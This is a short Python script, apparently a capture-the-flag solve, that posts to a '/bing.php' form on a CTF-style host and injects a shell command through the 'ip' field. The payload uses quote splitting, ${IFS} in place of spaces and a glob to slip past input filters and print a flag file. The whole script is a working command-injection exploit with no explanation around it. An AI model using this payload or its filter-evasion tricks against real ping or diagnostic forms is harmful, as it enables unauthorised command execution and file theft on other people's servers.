import httpx
import asyncio

URL = 'https://3dcd9349cfd35fa35a2b2936.deadsec.quest'

class BaseAPI():
	def __init__(self,url=URL):
		self.c = httpx.AsyncClient(base_url=url)

	def visit(self,cmd):
		return self.c.post('/bing.php',data={'ip':cmd,'Submit':'Submitted'})

class API(BaseAPI):
	...

async def main():
	api = API()
	res = await api.visit(';c\'a\'t${IFS}/fl?g.txt')
	print(res.text)

if __name__ == '__main__':
	asyncio.run(main())